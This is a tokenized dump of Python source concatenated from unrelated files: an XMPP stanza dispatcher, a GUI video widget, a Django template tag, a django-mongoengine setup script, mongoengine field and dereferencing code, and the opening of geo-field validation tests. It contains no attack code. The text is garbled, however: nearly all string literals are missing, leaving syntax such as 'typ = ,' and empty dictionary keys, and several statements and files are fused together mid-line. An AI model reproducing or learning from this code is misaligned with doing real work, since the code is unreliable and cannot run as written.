self . RegisterProtocol ( , Protocol , xmlns = xmlns ) \n 
self . RegisterProtocol ( , Protocol , xmlns = xmlns ) \n 
\n 
~~ def RegisterProtocol ( self , tag_name , Proto , xmlns = None , order = ) : \n 
~~~ """ Used to declare some top-level stanza name to dispatcher.\n           Needed to start registering handlers for such stanzas.\n           Iq, message and presence protocols are registered by default. """ \n 
if not xmlns : xmlns = self . _owner . defaultNamespace \n 
self . DEBUG ( \'Registering protocol "%s" as %s(%s)\' % ( tag_name , Proto , xmlns ) , order ) \n 
self . handlers [ xmlns ] [ tag_name ] = { type : Proto , : [ ] } \n 
\n 
~~ def RegisterNamespaceHandler ( self , xmlns , handler , typ = , ns = , makefirst = 0 , system = 0 ) : \n 
~~~ """ Register handler for processing all stanzas for specified namespace. """ \n 
self . RegisterHandler ( , handler , typ , ns , xmlns , makefirst , system ) \n 
\n 
~~ def RegisterHandler ( self , name , handler , typ = , ns = , xmlns = None , makefirst = 0 , system = 0 ) : \n 
~~~ """Register user callback as stanzas handler of declared type. Callback must take\n           (if chained, see later) arguments: dispatcher instance (for replying), incomed\n           return of previous handlers.\n           The callback must raise xmpp.NodeProcessed just before return if it want preven\n           callbacks to be called with the same stanza as argument _and_, more importantly\n           library from returning stanza to sender with error set (to be enabled in 0.2 ve\n            Arguments:\n              "name" - name of stanza. F.e. "iq".\n              "handler" - user callback.\n              "typ" - value of stanza\'s "type" attribute. If not specified any value match\n              "ns" - namespace of child that stanza must contain.\n              "chained" - chain together output of several handlers.\n              "makefirst" - insert handler in the beginning of handlers list instead of\n                adding it to the end. Note that more common handlers (i.e. w/o "typ" and "\n                will be called first nevertheless.\n              "system" - call handler even if NodeProcessed Exception were raised already.\n            """ \n 
if not xmlns : xmlns = self . _owner . defaultNamespace \n 
self . DEBUG ( \'Registering handler %s for "%s" type->%s ns->%s(%s)\' % ( handler , name , typ , ns , xmlns ) if not typ and not ns : typ = \n 
if not self . handlers . has_key ( xmlns ) : self . RegisterNamespace ( xmlns , ) \n 
if not self . handlers [ xmlns ] . has_key ( name ) : self . RegisterProtocol ( name , Protocol , xmlns , ) if not self . handlers [ xmlns ] [ name ] . has_key ( typ + ns ) : self . handlers [ xmlns ] [ name ] [ typ + ns ] = [ ] \n 
if makefirst : self . handlers [ xmlns ] [ name ] [ typ + ns ] . insert ( 0 , { : handler , : system } ) \n 
else : self . handlers [ xmlns ] [ name ] [ typ + ns ] . append ( { : handler , : system } ) \n 
\n 
~~ def RegisterHandlerOnce ( self , name , handler , typ = , ns = , xmlns = None , makefirst = 0 , system = 0 ) : \n 
~~~ """ Unregister handler after first call (not implemented yet). """ \n 
if not xmlns : xmlns = self . _owner . defaultNamespace \n 
self . RegisterHandler ( name , handler , typ , ns , xmlns , makefirst , system ) \n 
\n 
~~ def UnregisterHandler ( self , name , handler , typ = , ns = , xmlns = None ) : \n 
~~~ """ Unregister handler. "typ" and "ns" must be specified exactly the same as with registering.""" if not xmlns : xmlns = self . _owner . defaultNamespace \n 
if not self . handlers . has_key ( xmlns ) : return \n 
if not typ and not ns : typ = \n 
for pack in self . handlers [ xmlns ] [ name ] [ typ + ns ] : \n 
~~~ if handler == pack [ ] : break \n 
~~ else : pack = None \n 
try : self . handlers [ xmlns ] [ name ] [ typ + ns ] . remove ( pack ) \n 
except ValueError : pass \n 
\n 
~~ def RegisterDefaultHandler ( self , handler ) : \n 
~~~ """ Specify the handler that will be used if no NodeProcessed exception were raised.\n            This is returnStanzaHandler by default. """ \n 
self . _defaultHandler = handler \n 
\n 
~~ def RegisterEventHandler ( self , handler ) : \n 
~~~ """ Register handler that will process events. F.e. "FILERECEIVED" event. """ \n 
self . _eventHandler = handler \n 
\n 
~~ def returnStanzaHandler ( self , conn , stanza ) : \n 
~~~ """ Return stanza back to the sender with <feature-not-implemennted/> error set. """ \n 
if stanza . getType ( ) in [ , ] : \n 
~~~ conn . send ( Error ( stanza , ERR_FEATURE_NOT_IMPLEMENTED ) ) \n 
\n 
~~ ~~ def streamErrorHandler ( self , conn , error ) : \n 
~~~ name , text = , error . getData ( ) \n 
for tag in error . getChildren ( ) : \n 
~~~ if tag . getNamespace ( ) == NS_XMPP_STREAMS : \n 
~~~ if tag . getName ( ) == : text = tag . getData ( ) \n 
else : name = tag . getName ( ) \n 
~~ ~~ if name in stream_exceptions . keys ( ) : exc = stream_exceptions [ name ] \n 
else : exc = StreamError \n 
raise exc ( ( name , text ) ) \n 
\n 
~~ def RegisterCycleHandler ( self , handler ) : \n 
~~~ """ Register handler that will be called on every Dispatcher.Process() call. """ \n 
if handler not in self . _cycleHandlers : self . _cycleHandlers . append ( handler ) \n 
\n 
~~ def UnregisterCycleHandler ( self , handler ) : \n 
~~~ """ Unregister handler that will is called on every Dispatcher.Process() call.""" \n 
if handler in self . _cycleHandlers : self . _cycleHandlers . remove ( handler ) \n 
\n 
~~ def Event ( self , realm , event , data ) : \n 
~~~ """ Raise some event. Takes three arguments:\n            1) "realm" - scope of event. Usually a namespace. \n            2) "event" - the event itself. F.e. "SUCESSFULL SEND".\n            3) data that comes along with event. Depends on event.""" \n 
if self . _eventHandler : self . _eventHandler ( realm , event , data ) \n 
\n 
~~ def dispatch ( self , stanza , session = None , direct = 0 ) : \n 
~~~ """ Main procedure that performs XMPP stanza recognition and calling apppropriate handlers for it.\n            Called internally. """ \n 
if not session : session = self \n 
session . Stream . _mini_dom = None \n 
name = stanza . getName ( ) \n 
\n 
if not direct and self . _owner . _route : \n 
~~~ if name == : \n 
~~~ if stanza . getAttr ( ) == None : \n 
~~~ if len ( stanza . getChildren ( ) ) == 1 : \n 
~~~ stanza = stanza . getChildren ( ) [ 0 ] \n 
name = stanza . getName ( ) \n 
~~ else : \n 
~~~ for each in stanza . getChildren ( ) : \n 
~~~ self . dispatch ( each , session , direct = 1 ) \n 
~~ return \n 
~~ ~~ ~~ elif name == : \n 
~~~ return \n 
~~ elif name in ( , ) : \n 
~~~ pass \n 
~~ else : \n 
~~~ raise UnsupportedStanzaType ( name ) \n 
\n 
~~ ~~ if name == : session . Stream . features = stanza \n 
\n 
xmlns = stanza . getNamespace ( ) \n 
if not self . handlers . has_key ( xmlns ) : \n 
~~~ self . DEBUG ( "Unknown namespace: " + xmlns , ) \n 
xmlns = \n 
~~ if not self . handlers [ xmlns ] . has_key ( name ) : \n 
~~~ self . DEBUG ( "Unknown stanza: " + name , ) \n 
name = \n 
~~ else : \n 
~~~ self . DEBUG ( "Got %s/%s stanza" % ( xmlns , name ) , ) \n 
\n 
~~ if stanza . __class__ . __name__ == : stanza = self . handlers [ xmlns ] [ name ] [ type ] ( node = stanza ) \n 
\n 
typ = stanza . getType ( ) \n 
if not typ : typ = \n 
stanza . props = stanza . getProperties ( ) \n 
ID = stanza . getID ( ) \n 
\n 
session . DEBUG ( "Dispatching %s stanza with type->%s props->%s id->%s" % ( name , typ , stanza . props , \n 
list = [ ] # we will use all handlers: if self . handlers [ xmlns ] [ name ] . has_key ( typ ) : list . append ( typ ) # from very common... for prop in stanza . props : \n 
~~~ if self . handlers [ xmlns ] [ name ] . has_key ( prop ) : list . append ( prop ) \n 
if typ and self . handlers [ xmlns ] [ name ] . has_key ( typ + prop ) : list . append ( typ + prop ) # ...to very particular \n 
~~ chain = self . handlers [ xmlns ] [ ] [ ] \n 
for key in list : \n 
~~~ if key : chain = chain + self . handlers [ xmlns ] [ name ] [ key ] \n 
\n 
~~ output = \n 
if session . _expected . has_key ( ID ) : \n 
~~~ user = 0 \n 
if type ( session . _expected [ ID ] ) == type ( ( ) ) : \n 
~~~ cb , args = session . _expected [ ID ] \n 
session . DEBUG ( "Expected stanza arrived. Callback %s(%s) found!" % ( cb , args ) , ) \n 
try : cb ( session , stanza , ** args ) \n 
except Exception , typ : \n 
~~~ if typ . __class__ . __name__ < > : raise \n 
~~ ~~ else : \n 
~~~ session . DEBUG ( "Expected stanza arrived!" , ) \n 
session . _expected [ ID ] = stanza \n 
~~ ~~ else : user = 1 \n 
for handler in chain : \n 
~~~ if user or handler [ ] : \n 
~~~ try : \n 
~~~ handler [ ] ( session , stanza ) \n 
~~ except Exception , typ : \n 
~~~ if typ . __class__ . __name__ < > : \n 
~~~ self . _pendingExceptions . insert ( 0 , sys . exc_info ( ) ) \n 
return \n 
~~ user = 0 \n 
~~ ~~ ~~ if user and self . _defaultHandler : self . _defaultHandler ( session , stanza ) \n 
\n 
~~ def WaitForResponse ( self , ID , timeout = DefaultTimeout ) : \n 
~~~ """ Block and wait until stanza with specific "id" attribute will come.\n            If no such stanza is arrived within timeout, return None.\n            If operation failed for some reason then owner\'s attributes\n            lastErrNode, lastErr and lastErrCode are set accordingly. """ \n 
self . _expected [ ID ] = None \n 
has_timed_out = 0 \n 
abort_time = time . time ( ) + timeout \n 
self . DEBUG ( "Waiting for ID:%s with timeout %s..." % ( ID , timeout ) , ) \n 
while not self . _expected [ ID ] : \n 
~~~ if not self . Process ( 0.04 ) : \n 
~~~ self . _owner . lastErr = "Disconnect" \n 
return None \n 
~~ if time . time ( ) > abort_time : \n 
~~~ self . _owner . lastErr = "Timeout" \n 
return None \n 
~~ ~~ response = self . _expected [ ID ] \n 
del self . _expected [ ID ] \n 
if response . getErrorCode ( ) : \n 
~~~ self . _owner . lastErrNode = response \n 
self . _owner . lastErr = response . getError ( ) \n 
self . _owner . lastErrCode = response . getErrorCode ( ) \n 
~~ return response \n 
\n 
~~ def SendAndWaitForResponse ( self , stanza , timeout = DefaultTimeout ) : \n 
~~~ """ Put stanza on the wire and wait for recipient\'s response to it. """ \n 
return self . WaitForResponse ( self . send ( stanza ) , timeout ) \n 
\n 
~~ def SendAndCallForResponse ( self , stanza , func , args = { } ) : \n 
~~~ """ Put stanza on the wire and call back when recipient replies.\n            Additional callback arguments can be specified in args. """ \n 
self . _expected [ self . send ( stanza ) ] = ( func , args ) \n 
\n 
~~ def send ( self , stanza ) : \n 
~~~ """ Serialise stanza and put it on the wire. Assign an unique ID to it before send.\n            Returns assigned ID.""" \n 
if type ( stanza ) in [ type ( ) , type ( ) ] : return self . _owner_send ( stanza ) \n 
if not isinstance ( stanza , Protocol ) : _ID = None \n 
elif not stanza . getID ( ) : \n 
~~~ global ID \n 
ID += 1 \n 
_ID = ` ID ` \n 
stanza . setID ( _ID ) \n 
~~ else : _ID = stanza . getID ( ) \n 
if self . _owner . _registered_name and not stanza . getAttr ( ) : stanza . setAttr ( , self . _owner if self . _owner . _route and stanza . getName ( ) != : \n 
~~~ to = self . _owner . Server \n 
if stanza . getTo ( ) and stanza . getTo ( ) . getDomain ( ) : \n 
~~~ to = stanza . getTo ( ) . getDomain ( ) \n 
~~ frm = stanza . getFrom ( ) \n 
if frm . getDomain ( ) : \n 
~~~ frm = frm . getDomain ( ) \n 
~~ route = Protocol ( , to = to , frm = frm , payload = [ stanza ] ) \n 
stanza = route \n 
~~ stanza . setNamespace ( self . _owner . Namespace ) \n 
stanza . setParent ( self . _metastream ) \n 
self . _owner_send ( stanza ) \n 
return _ID \n 
\n 
~~ def disconnect ( self ) : \n 
~~~ """ Send a stream terminator and and handle all incoming stanzas before stream closure. """ \n 
self . _owner_send ( ) \n 
while self . Process ( 1 ) : pass \n 
~~ ~~ from . gl_utils import * \n 
from . texture import VideoTexture \n 
\n 
from . widget import Widget , BGUI_DEFAULT , WeakMethod \n 
from . image import Image \n 
\n 
\n 
class Video ( Image ) : \n 
~~~ """Widget for displaying video""" \n 
\n 
def __init__ ( self , parent , vid , name = None , play_audio = False , repeat = 0 , aspect = None , size = [ 1 , 1 ] , pos sub_theme = , options = BGUI_DEFAULT ) : \n 
~~~ """\n\t\t:param parent: the widget\'s parent\n\t\t:param name: the name of the widget\n\t\t:param vid: the video to use for the widget\n\t\t:param play_audio: play the audio track of the video\n\t\t:param repeat: how many times to repeat the video (-1 = infinite)\n\t\t:param aspect: constrain the widget size to a specified aspect ratio\n\t\t:param size: a tuple containing the width and height\n\t\t:param pos: a tuple containing the x and y position\n\t\t:param sub_theme: name of a sub_theme defined in the theme file (similar to CSS classes)\n\t\t:param options: various other options\n\n\t\t""" \n 
\n 
Image . __init__ ( self , parent , name , None , aspect , size , pos , sub_theme = sub_theme , options = options ) \n 
\n 
self . _texture = VideoTexture ( vid , GL_LINEAR , repeat , play_audio ) \n 
\n 
self . _on_finish = None \n 
self . _on_finish_called = False \n 
\n 
~~ def play ( self , start , end , use_frames = True , fps = None ) : \n 
~~~ self . _texture . play ( start , end , use_frames , fps ) \n 
\n 
# Reset the on_finish callback after every play \n 
self . _on_finish_called = False \n 
\n 
~~ @ property \n 
def on_finish ( self ) : \n 
~~~ """The widget\'s on_finish callback""" \n 
return self . _on_finish \n 
\n 
~~ @ on_finish . setter \n 
def on_finish ( self , value ) : \n 
~~~ self . _on_finish = WeakMethod ( value ) \n 
\n 
~~ def _draw ( self ) : \n 
~~~ """Draws the video frame""" \n 
\n 
self . _texture . update ( ) \n 
\n 
# Draw the textured quad \n 
Image . _draw ( self ) \n 
\n 
# Check if the video has finished playing through \n 
if self . _texture . video . status == 3 : \n 
~~~ if self . _on_finish and not self . _on_finish_called : \n 
~~~ self . on_finish ( self ) \n 
self . _on_finish_called = Truefrom django import template \n 
~~ ~~ ~~ ~~ from django . conf import settings \n 
\n 
register = template . Library ( ) \n 
\n 
class CheckGrappelli ( template . Node ) : \n 
~~~ def __init__ ( self , var_name ) : \n 
~~~ self . var_name = var_name \n 
~~ def render ( self , context ) : \n 
~~~ context [ self . var_name ] = in settings . INSTALLED_APPS \n 
return \n 
\n 
~~ ~~ def check_grappelli ( parser , token ) : \n 
~~~ """\n    Checks weather grappelli is in installed apps and sets a variable in the context.\n    Unfortunately there is no other way to find out if grappelli is used or not. \n    See: https://github.com/sehmaschine/django-grappelli/issues/32\n    \n    Usage: {% check_grappelli as <varname> %}\n    """ \n 
\n 
bits = token . contents . split ( ) \n 
\n 
if len ( bits ) != 3 : \n 
~~~ raise template . TemplateSyntaxError ( "\'check_grappelli\' tag takes exactly two arguments." ) \n 
\n 
~~ if bits [ 1 ] != : \n 
~~~ raise template . TemplateSyntaxError ( "The second argument to \'check_grappelli\' must be \'as\'" ) \n 
~~ varname = bits [ 2 ] \n 
\n 
return CheckGrappelli ( varname ) \n 
\n 
~~ register . tag ( check_grappelli ) \n 
"""\nDjango-MongoEngine\n------------------\n\nDjango support for MongoDB using MongoEngine.\n\nLinks\n`````\n\n* `development version\n  <https://github.com/MongoEngine/django-mongoengine/raw/master#egg=Django-MongoEngine-dev>`_\n\n""" \n 
from setuptools import setup , find_packages \n 
import sys , os \n 
\n 
\n 
__version__ = \n 
__description__ = , \n 
__license__ = \n 
__author__ = , \n 
__email__ = , \n 
\n 
\n 
sys . path . insert ( 0 , os . path . dirname ( __file__ ) ) \n 
\n 
\n 
REQUIRES = [ i . strip ( ) for i in open ( "requirements.txt" ) . readlines ( ) ] \n 
\n 
\n 
setup ( \n 
name = , \n 
version = __version__ , \n 
url = , \n 
download_url = , \n 
license = __license__ , \n 
author = __author__ , \n 
author_email = __email__ , \n 
description = __description__ , \n 
long_description = __doc__ , \n 
test_suite = , \n 
zip_safe = False , \n 
platforms = , \n 
install_requires = REQUIRES , \n 
packages = find_packages ( exclude = ( , , ) ) , \n 
include_package_data = True , \n 
# use python setup.py nosetests to test \n 
setup_requires = [ , ] , \n 
classifiers = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
] \n 
) \n 
from mongoengine . base import BaseField \n 
\n 
__all__ = ( ) \n 
\n 
class WtfBaseField ( BaseField ) : \n 
~~~ """\n    Extension wrapper class for mongoengine BaseField.\n\n    This enables flask-mongoengine  wtf to extend the\n    number of field parameters, and settings on behalf\n    of document model form generator for WTForm.\n\n    @param validators:  wtf model form field validators.\n    @param filters:     wtf model form field filters.\n    """ \n 
\n 
def __init__ ( self , validators = None , filters = None , ** kwargs ) : \n 
\n 
~~~ self . validators = self . _ensure_callable_or_list ( validators , ) \n 
self . filters = self . _ensure_callable_or_list ( filters , ) \n 
\n 
BaseField . __init__ ( self , ** kwargs ) \n 
\n 
\n 
~~ def _ensure_callable_or_list ( self , field , msg_flag ) : \n 
~~~ """\n        Ensure the value submitted via field is either\n        a callable object to convert to list or it is\n        in fact a valid list value.\n\n        """ \n 
if field is not None : \n 
~~~ if callable ( field ) : \n 
~~~ field = [ field ] \n 
~~ else : \n 
~~~ msg = "Argument \'%s\' must be a list value" % msg_flag \n 
if not isinstance ( field , list ) : \n 
~~~ raise TypeError ( msg ) \n 
\n 
~~ ~~ ~~ return field \n 
~~ ~~ from bson import DBRef , SON \n 
\n 
from mongoengine . python_support import txt_type \n 
\n 
from base import ( \n 
BaseDict , BaseList , EmbeddedDocumentList , \n 
TopLevelDocumentMetaclass , get_document \n 
) \n 
from fields import ( ReferenceField , ListField , DictField , MapField ) \n 
from connection import get_db \n 
from queryset import QuerySet \n 
from document import Document , EmbeddedDocument \n 
\n 
\n 
class DeReference ( object ) : \n 
~~~ def __call__ ( self , items , max_depth = 1 , instance = None , name = None ) : \n 
~~~ """\n        Cheaply dereferences the items to a set depth.\n        Also handles the conversion of complex data types.\n\n        :param items: The iterable (dict, list, queryset) to be dereferenced.\n        :param max_depth: The maximum depth to recurse to\n        :param instance: The owning instance used for tracking changes by\n            :class:`~mongoengine.base.ComplexBaseField`\n        :param name: The name of the field, used for tracking changes by\n            :class:`~mongoengine.base.ComplexBaseField`\n        :param get: A boolean determining if being called by __get__\n        """ \n 
if items is None or isinstance ( items , basestring ) : \n 
~~~ return items \n 
\n 
# cheapest way to convert a queryset to a list \n 
# list(queryset) uses a count() query to determine length \n 
~~ if isinstance ( items , QuerySet ) : \n 
~~~ items = [ i for i in items ] \n 
\n 
~~ self . max_depth = max_depth \n 
doc_type = None \n 
\n 
if instance and isinstance ( instance , ( Document , EmbeddedDocument , \n 
TopLevelDocumentMetaclass ) ) : \n 
~~~ doc_type = instance . _fields . get ( name ) \n 
while hasattr ( doc_type , ) : \n 
~~~ doc_type = doc_type . field \n 
\n 
~~ if isinstance ( doc_type , ReferenceField ) : \n 
~~~ field = doc_type \n 
doc_type = doc_type . document_type \n 
is_list = not hasattr ( items , ) \n 
\n 
if is_list and all ( [ i . __class__ == doc_type for i in items ] ) : \n 
~~~ return items \n 
~~ elif not is_list and all ( \n 
[ i . __class__ == doc_type for i in items . values ( ) ] ) : \n 
~~~ return items \n 
~~ elif not field . dbref : \n 
~~~ if not hasattr ( items , ) : \n 
\n 
~~~ def _get_items ( items ) : \n 
~~~ new_items = [ ] \n 
for v in items : \n 
~~~ if isinstance ( v , list ) : \n 
~~~ new_items . append ( _get_items ( v ) ) \n 
~~ elif not isinstance ( v , ( DBRef , Document ) ) : \n 
~~~ new_items . append ( field . to_python ( v ) ) \n 
~~ else : \n 
~~~ new_items . append ( v ) \n 
~~ ~~ return new_items \n 
\n 
~~ items = _get_items ( items ) \n 
~~ else : \n 
~~~ items = dict ( [ \n 
( k , field . to_python ( v ) ) \n 
if not isinstance ( v , ( DBRef , Document ) ) else ( k , v ) \n 
for k , v in items . iteritems ( ) ] \n 
) \n 
\n 
~~ ~~ ~~ ~~ self . reference_map = self . _find_references ( items ) \n 
self . object_map = self . _fetch_objects ( doc_type = doc_type ) \n 
return self . _attach_objects ( items , 0 , instance , name ) \n 
\n 
~~ def _find_references ( self , items , depth = 0 ) : \n 
~~~ """\n        Recursively finds all db references to be dereferenced\n\n        :param items: The iterable (dict, list, queryset)\n        :param depth: The current depth of recursion\n        """ \n 
reference_map = { } \n 
if not items or depth >= self . max_depth : \n 
~~~ return reference_map \n 
\n 
# Determine the iterator to use \n 
~~ if not hasattr ( items , ) : \n 
~~~ iterator = enumerate ( items ) \n 
~~ else : \n 
~~~ iterator = items . iteritems ( ) \n 
\n 
# Recursively find dbreferences \n 
~~ depth += 1 \n 
for k , item in iterator : \n 
~~~ if isinstance ( item , ( Document , EmbeddedDocument ) ) : \n 
~~~ for field_name , field in item . _fields . iteritems ( ) : \n 
~~~ v = item . _data . get ( field_name , None ) \n 
if isinstance ( v , DBRef ) : \n 
~~~ reference_map . setdefault ( field . document_type , set ( ) ) . add ( v . id ) \n 
~~ elif isinstance ( v , ( dict , SON ) ) and in v : \n 
~~~ reference_map . setdefault ( get_document ( v [ ] ) , set ( ) ) . add ( v [ ] . id ) \n 
~~ elif isinstance ( v , ( dict , list , tuple ) ) and depth <= self . max_depth : \n 
~~~ field_cls = getattr ( getattr ( field , , None ) , , None ) \n 
references = self . _find_references ( v , depth ) \n 
for key , refs in references . iteritems ( ) : \n 
~~~ if isinstance ( field_cls , ( Document , TopLevelDocumentMetaclass ) ) : \n 
~~~ key = field_cls \n 
~~ reference_map . setdefault ( key , set ( ) ) . update ( refs ) \n 
~~ ~~ ~~ ~~ elif isinstance ( item , DBRef ) : \n 
~~~ reference_map . setdefault ( item . collection , set ( ) ) . add ( item . id ) \n 
~~ elif isinstance ( item , ( dict , SON ) ) and in item : \n 
~~~ reference_map . setdefault ( get_document ( item [ ] ) , set ( ) ) . add ( item [ ] . id ) \n 
~~ elif isinstance ( item , ( dict , list , tuple ) ) and depth - 1 <= self . max_depth : \n 
~~~ references = self . _find_references ( item , depth - 1 ) \n 
for key , refs in references . iteritems ( ) : \n 
~~~ reference_map . setdefault ( key , set ( ) ) . update ( refs ) \n 
\n 
~~ ~~ ~~ return reference_map \n 
\n 
~~ def _fetch_objects ( self , doc_type = None ) : \n 
~~~ """Fetch all references and convert to their document objects\n        """ \n 
object_map = { } \n 
for collection , dbrefs in self . reference_map . iteritems ( ) : \n 
~~~ if hasattr ( collection , ) : # We have a document class for the refs \n 
~~~ col_name = collection . _get_collection_name ( ) \n 
refs = [ dbref for dbref in dbrefs \n 
if ( col_name , dbref ) not in object_map ] \n 
references = collection . objects . in_bulk ( refs ) \n 
for key , doc in references . iteritems ( ) : \n 
~~~ object_map [ ( col_name , key ) ] = doc \n 
~~ ~~ else : # Generic reference: use the refs data to convert to document \n 
~~~ if isinstance ( doc_type , ( ListField , DictField , MapField , ) ) : \n 
~~~ continue \n 
\n 
~~ refs = [ dbref for dbref in dbrefs \n 
if ( collection , dbref ) not in object_map ] \n 
\n 
if doc_type : \n 
~~~ references = doc_type . _get_db ( ) [ collection ] . find ( { : { : refs } } ) \n 
for ref in references : \n 
~~~ doc = doc_type . _from_son ( ref ) \n 
object_map [ ( collection , doc . id ) ] = doc \n 
~~ ~~ else : \n 
~~~ references = get_db ( ) [ collection ] . find ( { : { : refs } } ) \n 
for ref in references : \n 
~~~ if in ref : \n 
~~~ doc = get_document ( ref [ "_cls" ] ) . _from_son ( ref ) \n 
~~ elif doc_type is None : \n 
~~~ doc = get_document ( \n 
. join ( x . capitalize ( ) \n 
for x in collection . split ( ) ) ) . _from_son ( ref ) \n 
~~ else : \n 
~~~ doc = doc_type . _from_son ( ref ) \n 
~~ object_map [ ( collection , doc . id ) ] = doc \n 
~~ ~~ ~~ ~~ return object_map \n 
\n 
~~ def _attach_objects ( self , items , depth = 0 , instance = None , name = None ) : \n 
~~~ """\n        Recursively finds all db references to be dereferenced\n\n        :param items: The iterable (dict, list, queryset)\n        :param depth: The current depth of recursion\n        :param instance: The owning instance used for tracking changes by\n            :class:`~mongoengine.base.ComplexBaseField`\n        :param name: The name of the field, used for tracking changes by\n            :class:`~mongoengine.base.ComplexBaseField`\n        """ \n 
if not items : \n 
~~~ if isinstance ( items , ( BaseDict , BaseList ) ) : \n 
~~~ return items \n 
\n 
~~ if instance : \n 
~~~ if isinstance ( items , dict ) : \n 
~~~ return BaseDict ( items , instance , name ) \n 
~~ else : \n 
~~~ return BaseList ( items , instance , name ) \n 
\n 
~~ ~~ ~~ if isinstance ( items , ( dict , SON ) ) : \n 
~~~ if in items : \n 
~~~ return self . object_map . get ( \n 
( items [ ] . collection , items [ ] . id ) , items ) \n 
~~ elif in items : \n 
~~~ doc = get_document ( items [ ] ) . _from_son ( items ) \n 
_cls = doc . _data . pop ( , None ) \n 
del items [ ] \n 
doc . _data = self . _attach_objects ( doc . _data , depth , doc , None ) \n 
if _cls is not None : \n 
~~~ doc . _data [ ] = _cls \n 
~~ return doc \n 
\n 
~~ ~~ if not hasattr ( items , ) : \n 
~~~ is_list = True \n 
list_type = BaseList \n 
if isinstance ( items , EmbeddedDocumentList ) : \n 
~~~ list_type = EmbeddedDocumentList \n 
~~ as_tuple = isinstance ( items , tuple ) \n 
iterator = enumerate ( items ) \n 
data = [ ] \n 
~~ else : \n 
~~~ is_list = False \n 
iterator = items . iteritems ( ) \n 
data = { } \n 
\n 
~~ depth += 1 \n 
for k , v in iterator : \n 
~~~ if is_list : \n 
~~~ data . append ( v ) \n 
~~ else : \n 
~~~ data [ k ] = v \n 
\n 
~~ if k in self . object_map and not is_list : \n 
~~~ data [ k ] = self . object_map [ k ] \n 
~~ elif isinstance ( v , ( Document , EmbeddedDocument ) ) : \n 
~~~ for field_name , field in v . _fields . iteritems ( ) : \n 
~~~ v = data [ k ] . _data . get ( field_name , None ) \n 
if isinstance ( v , DBRef ) : \n 
~~~ data [ k ] . _data [ field_name ] = self . object_map . get ( \n 
( v . collection , v . id ) , v ) \n 
~~ elif isinstance ( v , ( dict , SON ) ) and in v : \n 
~~~ data [ k ] . _data [ field_name ] = self . object_map . get ( \n 
( v [ ] . collection , v [ ] . id ) , v ) \n 
~~ elif isinstance ( v , ( dict , list , tuple ) ) and depth <= self . max_depth : \n 
~~~ item_name = txt_type ( "{0}.{1}.{2}" ) . format ( name , k , field_name ) \n 
data [ k ] . _data [ field_name ] = self . _attach_objects ( v , depth , instance = instance ~~ ~~ ~~ elif isinstance ( v , ( dict , list , tuple ) ) and depth <= self . max_depth : \n 
~~~ item_name = % ( name , k ) if name else name \n 
data [ k ] = self . _attach_objects ( v , depth - 1 , instance = instance , name = item_name ) \n 
~~ elif hasattr ( v , ) : \n 
~~~ data [ k ] = self . object_map . get ( ( v . collection , v . id ) , v ) \n 
\n 
~~ ~~ if instance and name : \n 
~~~ if is_list : \n 
~~~ return tuple ( data ) if as_tuple else list_type ( data , instance , name ) \n 
~~ return BaseDict ( data , instance , name ) \n 
~~ depth += 1 \n 
return data \n 
# -*- coding: utf-8 -*- \n 
~~ ~~ import sys \n 
sys . path [ 0 : 0 ] = [ "" ] \n 
\n 
import unittest \n 
\n 
from mongoengine import * \n 
from mongoengine . connection import get_db \n 
\n 
__all__ = ( "GeoFieldTest" , ) \n 
\n 
\n 
class GeoFieldTest ( unittest . TestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
~~~ connect ( db = ) \n 
self . db = get_db ( ) \n 
\n 
~~ def _test_for_expected_error ( self , Cls , loc , expected ) : \n 
~~~ try : \n 
~~~ Cls ( loc = loc ) . validate ( ) \n 
self . fail ( . format ( loc ) ) \n 
~~ except ValidationError as e : \n 
~~~ self . assertEqual ( expected , e . to_dict ( ) [ ] ) \n 
\n 
~~ ~~ def test_geopoint_validation ( self ) : \n 
~~~ class Location ( Document ) : \n 
~~~ loc = GeoPointField ( ) \n 
\n 
~~ invalid_coords = [ { "x" : 1 , "y" : 2 } , 5 , "a" ] \n 
expected = \n 
\n 
for coord in invalid_coords : \n 
~~~ self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ invalid_coords = [ [ ] , [ 1 ] , [ 1 , 2 , 3 ] ] \n 
for coord in invalid_coords : \n 
~~~ expected = "Value (%s) must be a two-dimensional point" % repr ( coord ) \n 
self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ invalid_coords = [ [ { } , { } ] , ( "a" , "b" ) ] \n 
for coord in invalid_coords : \n 
~~~ expected = "Both values (%s) in point must be float or int" % repr ( coord ) \n 
self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ ~~ def test_point_validation ( self ) : \n 
~~~ class Location ( Document ) : \n 
~~~ loc = PointField ( ) \n 
\n 
~~ invalid_coords = { "x" : 1 , "y" : 2 } \n 
expected = \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MadeUp" , "coordinates" : [ ] } \n 
expected = \'PointField type must be "Point"\' \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "Point" , "coordinates" : [ 1 , 2 , 3 ] } \n 
expected = "Value ([1, 2, 3]) must be a two-dimensional point" \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = [ 5 , "a" ] \n 
expected = "PointField can only accept lists of [x, y]" \n 
for coord in invalid_coords : \n 
~~~ self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ invalid_coords = [ [ ] , [ 1 ] , [ 1 , 2 , 3 ] ] \n 
for coord in invalid_coords : \n 
~~~ expected = "Value (%s) must be a two-dimensional point" % repr ( coord ) \n 
self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ invalid_coords = [ [ { } , { } ] , ( "a" , "b" ) ] \n 
for coord in invalid_coords : \n 
~~~ expected = "Both values (%s) in point must be float or int" % repr ( coord ) \n 
self . _test_for_expected_error ( Location , coord , expected ) \n 
\n 
~~ Location ( loc = [ 1 , 2 ] ) . validate ( ) \n 
Location ( loc = { \n 
"type" : "Point" , \n 
"coordinates" : [ \n 
81.4471435546875 , \n 
23.61432859499169 \n 
] } ) . validate ( ) \n 
\n 
~~ def test_linestring_validation ( self ) : \n 
~~~ class Location ( Document ) : \n 
~~~ loc = LineStringField ( ) \n 
\n 
~~ invalid_coords = { "x" : 1 , "y" : 2 } \n 
expected = \n 
self . _test_for_expected_error ( Location , invalid_coords , expected ) \n 
\n 
invalid_coords = { "type" : "MadeUp" , "coordinates" : [ [ ] ] } \n 
